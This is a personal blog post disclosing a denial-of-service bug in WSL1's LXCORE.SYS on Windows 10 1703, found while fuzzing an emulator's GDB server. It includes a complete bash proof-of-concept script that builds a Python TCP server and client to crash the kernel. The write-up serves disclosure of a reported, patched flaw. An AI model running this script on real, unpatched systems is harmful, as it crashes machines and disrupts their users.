---
id: 438
title: 'Babesia &#8211; Windows 10 1703 DoS in lxcore'
date: '2020-01-10T20:04:36+01:00'
author: Martin
layout: post
guid: 'https://www.sundhaug.com/?p=438'
permalink: /w10-1703-bugcheck-in-lxcore/
categories:
    - Hacking
---

## Timeline

```
<pre class="wp-block-preformatted">Found at or before May 2nd, 2017
Reported May 2nd~3rd, 2017
Fixed in 10.0.15063.XXX 2017-XX-XX
```

## Demo

<figure class="wp-block-embed-youtube wp-block-embed is-type-video is-provider-youtube wp-embed-aspect-16-9 wp-has-aspect-ratio"><div class="wp-block-embed__wrapper"><span class="embed-youtube" style="text-align:center; display: block;"><iframe allowfullscreen="true" class="youtube-player" height="296" loading="lazy" sandbox="allow-scripts allow-same-origin allow-popups allow-presentation" src="https://www.youtube.com/embed/i99ut6KgdvQ?version=3&rel=1&showsearch=0&showinfo=1&iv_load_policy=1&fs=1&hl=en-US&autohide=2&wmode=transparent" style="border:0;" width="525"></iframe></span></div></figure>## Story

Years ago, while trying to fuzz the GDB-server-implementation in the Nintendo® Game Boy Advance-emulator VBA-M (Visual-Boy Advance), I came upon a few issues. For one, fuzzing on Windows 10, my primary operating-system, was not as easy as I’d like it to. Now this was a fairly easy problem to solve, as Microsoft had just a few months before released their first stable release of the Windows Subsystem for Linux (IIRC, still called Bash on Windows at the time). The second issue, was that I couldn’t find an appropriate protocol-fuzzer for GDB. This required a bit more work, requiring me to write one myself in python. GDB treats a TCP-connection as a serial-port, meaning it reuses the GDB serial-protocol. The GDB serial-protocol is reasonably well documented, so this didn’t pose too many additional hours. Then, there was the big issue: My computer crashing.

<figure class="wp-block-image size-large">![In Norwegian: "Your PC ran into a problem and needs to restart. We're just collecting some error info, and then we'll restart for you.
...
Stop-code SYSTEM_THREAD_EXCEPTION_NOT_HANDLED
What failed: LXCORE.SYS"](https://i0.wp.com/www.sundhaug.com/wp-content/uploads/2020/01/image.png?resize=525%2C386&ssl=1)<figcaption>Picture of the bugcheck</figcaption></figure>A bugcheck, or Blue Screen Of Death, is triggered whenever the Windows kernel detects an error. VBA-M runs in user-mode, as does GDB, as does my python-based fuzzer. Nothing in user-mode should be able to cause a kernel crash and if it does, that’s a bug, and a potential security-issue.

So, now the questions become what’s triggered, where is it triggered, and how is it triggered.

Now, the first clue is in the bugcheck itself, on the bottom-most line: “LXCORE.SYS”. LXCORE.SYS, which was previously known as dates back to Microsofts Project Astoria, and is the core kernel-component of WSL1 (As the name suggests). So now we know what kernel-module is failing, and it’s not too surprising that it is the (then) relatively new WSL1.

The second clue? Well it happens when VBA-M has its GDB-server enabled, but not when it isn’t. Third, when the bugcheck is triggered, Windows writes a memory-dump to the C:\\-drive. The memory-dump includes everything that’s needed to find out what went wrong, including the stack-trace. The stack-trace, or the call-stack if you will, includes references to functions like: “LxpSocketInetStreamShutdownInternal”, “LxpSocketInetStreamFileReleaseInternal”, and “LxpSocketInetStreamAcceptWorkerRoutine”. These functions have a few words in common, such as “Lxp” (possibly LinuX Pico), “Inet” (indicating IP), and “Stream” (in context, TCP). The word “Accept” indicates that it likely has to do with the server accepting a connection.

## Exploit

Now, to test the hypothesis, we need to create the most basic possible “server”, and associated client. To accept a TCP-connection, you need to do three syscalls in a \*nix-system:

1. You need to bind the socket to a port
2. You need to listen on that socket
3. You need to accept the connection

When you do this, and have a client send data early, you end up with a bugcheck. Yay for crashing the PC.

The below exploit is very simple, it’s just a bash-program (with some flare of course), that writes a python client and a python server to disk, then runs both of them for a few seconds (assuming that if the bug is triggered, it’s relatively fast). If the program completes running for more than 1 minute, it’s assumed that the bugcheck has been fixed.

<div class="wp-block-syntaxhighlighter-code ">```
<pre class="brush: bash; title: ; notranslate" title="">
#!/bin/bash
function typewriter
{
    text="$1"
    for i in $(seq 0 $(expr length "${text}")) ; do
        echo -n "${text:$i:1}"
        sleep 0.003
    done
}

function hackify
{
    echo -e "\033[38;2;0;250;0m"
    echo -e "\033[48;2;0;000;0m"
}

typewriter "[ * ] Hackifying terminal"
for i in $(seq 3); do
    echo -n .
    sleep .3
done
hackify
clear
typewriter "[ * ] Terminal hackified"
sleep 1
clear

typewriter "|----------------------------------------|";echo
typewriter "|                                        |";echo
typewriter "|                Babesia                 |";echo
typewriter "|                                        |";echo
typewriter "|             by @sundhaug92             |";echo
typewriter "|                                        |";echo
typewriter "|----------------------------------------|";echo

echo
echo  3
echo "
import socket
import time
s = socket.socket()
s.bind(('0.0.0.0', 55555))
s.listen(1)
s.accept()
while True: time.sleep(1)" > server.py
sleep 1
echo 2
echo -e "
import socket
r = []
while True:
    s = socket.socket()
    s.connect(('localhost', 55555))
    s.send(b'A')
    r.append(s)" > client.py
sleep 1

echo 1
python server.py &
server_pid=$!
sleep 1

python3 client.py &
client_pid=$!
sleep 1
echo IMPACT

for i in $(seq 60); do
    echo -n .
    sleep 1
done

clear

typewriter "https://www.youtube.com/watch?v=w1--BxLy3lg#t=1m39s";echo
typewriter "^ We're still here'";echo
echo
typewriter "killing child-processes"
kill -9 $server_pid $client_pid
```

</div>The exploit is named after Babesia, which is a single-cell parasite.